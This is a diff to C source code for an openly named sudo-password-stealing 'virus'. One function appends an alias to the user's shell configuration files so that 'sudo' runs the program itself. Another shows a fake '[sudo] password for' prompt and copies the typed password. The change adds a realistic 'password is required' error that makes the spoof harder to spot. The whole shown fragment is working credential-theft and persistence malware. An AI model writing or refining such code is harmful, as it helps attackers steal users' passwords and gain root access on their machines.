@@ -27,7 +27,7 @@ int main(int argc, char ** argv){
   if(mode == P_IMPLANT){
     alias_virus();
   }
-  
+
   //fake being sudo. We know we are sudo because we recieved the sudo alias prompt
   if(mode == P_SUDO){
     char passwd[PASSWD_SIZE];
@@ -53,25 +53,31 @@ int steal_password(char * passwd, char * username){
   sprintf(prompt,"[sudo] password for %s: ", username);
 
   char * returned_pass = getpass(prompt);
-  
+
+  // returned_pass[strlen(returned_pass)] = 0;
+
   strcpy(passwd, returned_pass);
 
   free(returned_pass);
 
+  if(strlen(passwd)==0){
+    printf("sudo: a password is required\n");
+    exit(1);
+  }
 }
 
 int alias_virus(){
   //get the home dir
   char * home_dir_path= getenv("HOME");
-  
+
   //get the path to the virus
   char path_to_this_exe[1024] = "";
   readlink("/proc/self/exe", path_to_this_exe, sizeof(path_to_this_exe));
-  
+
   //prepare the alias
   char alias[2048] = "alias sudo=\"";
   sprintf(alias, "alias sudo=\"%s SUDO '$@'\"", path_to_this_exe);
-  
+
   for (int i = 0; i<sizeof(CONFIGS)/sizeof(char *); i++){
     append_virus(home_dir_path, CONFIGS[i], alias);
   }
